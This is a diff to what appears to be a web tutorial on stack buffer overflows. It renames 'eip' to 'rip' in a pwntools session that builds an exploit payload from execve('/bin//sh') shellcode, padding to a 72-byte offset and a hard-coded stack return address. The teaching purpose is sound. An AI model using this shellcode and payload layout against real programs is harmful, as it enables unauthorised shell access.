@@ -436,8 +436,8 @@ Type "help", "copyright", "credits" or "license" for more information.
 <a class="command">>>></a> from pwn import *
 <a class="command">>>></a> shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
 <a class="command">>>></a> offset = b"\x55" * (72-23)
-<a class="command">>>></a> eip = 0x7fffffffe4a0
-<a class="command">>>></a> payload = shellcode + offset + p64(eip)
+<a class="command">>>></a> rip = 0x7fffffffe4a0
+<a class="command">>>></a> payload = shellcode + offset + p64(rip)
 <a class="command">>>></a> print(payload)
 H1\xf6VH\xbf/bin//shWT_j;X\x99\x0f\x05UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\xa0\xe4\xff\xff\xff\x7f\x00\x00</pre>
 <pre class="pre-code">
